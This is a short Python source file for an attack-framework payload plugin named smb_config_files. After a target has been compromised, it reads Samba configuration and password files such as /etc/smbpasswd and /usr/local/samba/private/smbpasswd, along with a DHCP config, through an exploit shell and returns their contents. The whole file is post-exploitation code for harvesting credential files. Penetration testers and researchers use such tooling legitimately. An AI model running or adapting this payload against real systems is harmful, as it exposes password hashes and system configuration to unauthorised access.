import re
from plugins.attack.payloads.base_payload import base_payload

class smb_config_files(base_payload):
    '''
    This payload shows SMB configuration files
    '''
    def api_read(self):
        result = []
        files = []

        files.append('/usr/local/samba/lib/smb.conf')
        files.append('/etc/smb.conf')
        files.append('/etc/smbpasswd')
        files.append('/etc/smbusers')
        files.append('/etc/smbfstab')
        files.append('/etc/samba/smb.conf')
        files.append('/etc/samba/smbfstab')
        files.append('/etc/samba/smbpasswd')
        files.append('/usr/local/samba/private/smbpasswd')

        files.append('/usr/local/etc/dhcpd.conf')

        for file in files:
            if self.shell.read(file) != '':
                result.append('-------------------------')
                result.append('FILE => '+file)
                result.append(self.shell.read(file))

        result = [p for p in result if p != '']
        return result
        
    def run_read(self):
        result = self.api_read()
        if result == [ ]:
            result.append('SMB configuration files not found.')
        return result
        
